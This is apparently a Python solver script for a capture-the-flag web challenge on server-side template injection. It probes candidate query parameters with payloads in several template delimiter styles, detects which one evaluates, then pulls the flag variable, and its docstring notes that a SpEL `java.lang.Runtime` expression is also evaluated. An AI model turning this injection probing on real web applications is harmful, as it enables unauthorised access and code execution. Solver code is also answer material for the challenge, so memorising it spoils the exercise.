"""D23 "Template Temper" (web-exploitation-day-11-template-temper): server-side template injection.

Kit shape: /api/clues = {framework, current_role, feature_route}; GET <feature_route>?template=<text> renders the text
through an expression engine ("Rendered message" <pre>). `{{7*7}}` -> 49 and `{{objective}}` -> the proof (single:
Spring Boot costume, SpEL-ish `{{T(java.lang.Runtime)}}` also evaluated). Param name / delimiter may be re-dealt per
variant, so: probe each candidate param with every delimiter family at once, read which one evaluated (49), then ask
that delimiter for `objective`. Re-runnable on any fresh target.
"""
import re
import urllib.parse

from lib import websolve

PARAMS = ("template", "message", "tpl", "text", "q", "name", "input", "content", "expr", "body", "msg", "greeting")
DELIMS = (("{{", "}}"), ("${", "}"), ("*{", "}"), ("#{", "}"), ("<%= ", " %>"), ("{", "}"))
VARS = ("objective", "proof", "flag")


def _routes(base, clues):
    j = clues if isinstance(clues, dict) else {}
    rs = [v for k, v in j.items() if isinstance(v, str) and re.fullmatch(r"/[\w./-]+", v)]
    rs.sort(key=lambda v: 0 if re.search(r"feature|render|template|preview", next(k for k in j if j[k] == v), re.I) else 1)
    return list(dict.fromkeys(rs))


def exploit(base, clues):
    for r in _routes(base, clues):
        url = urllib.parse.urljoin(base, r)
        st, body, _ = websolve.fetch(url)
        p = websolve.proof(body)
        if p:
            return p
        for name in PARAMS:
            probe = "|".join(f"{a}{7 * 7 + i}*1{b}" for i, (a, b) in enumerate(DELIMS))
            _, body, _ = websolve.fetch(url + "?" + urllib.parse.urlencode({name: probe}))
            p = websolve.proof(body)
            if p:
                return p
            hits = [d for i, d in enumerate(DELIMS)
                    if str(49 + i) in body and f"{d[0]}{49 + i}*1{d[1]}" not in body]
            if not hits and not re.search(r"\b(49|5[0-4])\b", body):
                continue
            for a, b in hits or DELIMS:
                for v in VARS:
                    _, body, _ = websolve.fetch(url + "?" + urllib.parse.urlencode({name: f"{a}{v}{b}"}))
                    p = websolve.proof(body)
                    if p:
                        return p
    return None


KEY_MAP = [(r"framework|template|engine|expression", "day23_web_template_temper")]
HANDLERS = {"day23_web_template_temper": exploit}
